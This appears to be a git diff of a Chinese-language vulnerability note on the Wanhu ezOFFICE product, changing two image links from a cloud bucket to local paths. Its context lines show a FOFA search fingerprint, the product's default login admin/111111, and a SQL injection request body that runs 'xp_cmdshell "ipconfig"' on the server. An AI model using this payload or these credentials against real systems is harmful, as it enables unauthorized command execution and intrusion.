@@ -20,7 +20,7 @@ app="万户网络-ezOFFICE"
 
 产品页面
 
-![image-20220520132902980](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205201329080.png)
+![image-20220520132902980](./images/202205201329080.png)
 
 默认账号密码：admin/111111
 
@@ -42,4 +42,4 @@ Upgrade-Insecure-Requests: 1
 database=localDataSource&dataSQL=exec+master..xp_cmdshell+"ipconfig";
 ```
 
-![image-20220520132915993](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205201329050.png)
+![image-20220520132915993](./images/202205201329050.png)
